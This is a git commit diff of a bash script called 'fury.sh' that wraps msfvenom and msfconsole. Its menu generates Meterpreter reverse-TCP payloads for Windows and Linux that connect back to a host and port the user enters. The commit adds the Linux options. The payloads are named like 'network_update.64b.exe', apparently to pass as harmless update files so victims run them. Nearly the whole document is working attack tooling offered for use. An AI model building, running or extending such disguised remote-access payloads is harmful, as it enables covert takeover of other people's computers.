bfeb53b67feb6273569834839e176c249259f4b3
manorossa078-dev <manorossa078@gmail.com>
2026-06-09 16:28:23 +0200

    Update version to v.0.0.4

--- fury.sh
+++ fury.sh
@@ -4,7 +4,7 @@ readonly RED="\e[1;31m"
 readonly GREEN="\e[1;32m"
 readonly YELLOW="\e[1;33m"
 readonly RESET="\e[0m"
-readonly VERSION="v.0.0.3"
+readonly VERSION="v.0.0.4"
 readonly NOTES="Only available for Windows for now..."
 
 echo -e "${RED}"
@@ -21,38 +21,47 @@ EOF
 echo -e "${YELLOW}Fury $VERSION"
 
 if [ -z "$1" ]; then
-	echo -e "${RED}Error. Try using a flag like -h to view help." >&2
-	exit 1
+        echo -e "${RED}Error. Try using a flag like -h to view help." >&2
+        exit 1
 elif [ "$1" == "-h" ]; then
-	echo "-----------------------------------"
-	echo "Use -h to view this message"
-	echo "Use -gp to generate a payload"
-	echo "Use -lc to launch the console"
-	echo "-----------------------------------"
+        echo "-----------------------------------"
+        echo "Use -h to view this message"
+        echo "Use -gp to generate a payload"
+        echo "Use -lc to launch the console"
+        echo "-----------------------------------"
 elif [ "$1" == "-gp" ]; then
-	read -p "Enter the operating system: " OS
-	read -p "Enter the architecture: " architecture
-	read -p "Enter your IPv4 address: " HOST
-	read -p "Enter your port: " PORT
-	if [ "$OS" != "windows" ] && [ "$OS" != "linux" ]; then
-		echo -e "${RED}Error. Operating system not found."
-		exit 1
-	elif [ "$OS" == "windows" ] && [ "$architecture" == "x64" ]; then
-		echo -e "[*] Generating $OS $architecture payload...${RESET}"
-		mkdir payloads
-		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.64b.exe
-		echo -e "${GREEN}[+] Payload generated!"
-	elif [ "$OS" == "windows" ] && [ "$architecture" == "x86" ]; then
-		echo -e "[*] Generating $OS $architecture payload...${RESET}"
-		mkdir payloads
-		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.32b.exe
-		echo -e "${GREEN}[+] Payload generated!"
-	fi
+        read -p "Enter the operating system: " OS
+        read -p "Enter the architecture: " architecture
+        read -p "Enter your IPv4 address: " HOST
+        read -p "Enter your port: " PORT
+        if [ "$OS" != "windows" ] && [ "$OS" != "linux" ]; then
+                echo -e "${RED}Error. Operating system not found."
+                exit 1
+        elif [ "$OS" == "windows" ] && [ "$architecture" == "x64" ]; then
+                echo -e "[*] Generating $OS $architecture payload...${RESET}"
+                mkdir payloads
+                msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.64b.exe
+                echo -e "${GREEN}[+] Payload generated!"
+        elif [ "$OS" == "windows" ] && [ "$architecture" == "x86" ]; then
+                echo -e "[*] Generating $OS $architecture payload...${RESET}"
+                mkdir payloads
+                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.32b.exe
+                echo -e "${GREEN}[+] Payload generated!"
+        elif [ "$OS" == "linux" ] && [ "$architecture" == "x64" ]; then
+                echo -e "[*] Generating $OS $architecture payload...${RESET}"
+                mkdir payloads
+                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o payloads/network_update.64b.elf
+                echo -e "${GREEN}[+] Payload generated!"
+        elif [ "$OS" == "linux" ] && [ "$architecture" == "x86" ]; then
+                echo -e "Generating $OS $architecture payload...${RESET}"
+                msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o network_update.32b.elf
+                echo -e "${GREEN}[+] Payload generated!"
+        fi
 elif [ "$1" == "-lc" ]; then
-	echo -e "[*] Launching console...${RESET}"
-	msfconsole
-	echo -e "${YELLOW}[*] Console killed."
+        echo -e "[*] Launching console...${RESET}"
+        msfconsole
+        echo -e "${YELLOW}[*] Console killed."
 else
-	echo -e "${RED}Error. Invalid flag. Try -h to view help." >&2
-	exit 1
+        echo -e "${RED}Error. Invalid flag. Try -h to view help." >&2
+        exit 1
 fi
